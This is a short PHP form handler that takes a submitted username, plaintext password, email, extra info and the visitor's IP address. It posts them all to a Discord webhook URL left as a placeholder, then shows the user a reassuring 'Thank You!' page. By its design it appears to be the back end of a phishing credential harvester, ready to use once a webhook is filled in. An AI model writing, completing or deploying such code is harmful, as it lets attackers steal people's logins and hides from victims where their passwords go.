<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $email = $_POST['email'];
    $additional_info = $_POST['additional_info'];

    // Get IP address
    $ip_address = $_SERVER['REMOTE_ADDR'];

    // Prepare data to send to Discord bot
    $data = [
        'username' => $username,
        'password' => $password,
        'email' => $email,
        'additional_info' => $additional_info,
        'ip_address' => $ip_address
    ];

    // Convert data to JSON format
    $json_data = json_encode($data);

    // URL of your Discord bot webhook
    $webhook_url = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL_HERE";

    // Use cURL to send data to the Discord bot
    $ch = curl_init($webhook_url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ['payload_json' => $json_data]);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/json'
    ]);
    curl_exec($ch);
    curl_close($ch);

    // Send response back to the user
    echo "<div class='container'>";
    echo "<h1>Thank You!</h1>";
    echo "<p>Your information has been submitted successfully.</p>";
    echo "</div>";
}
?>
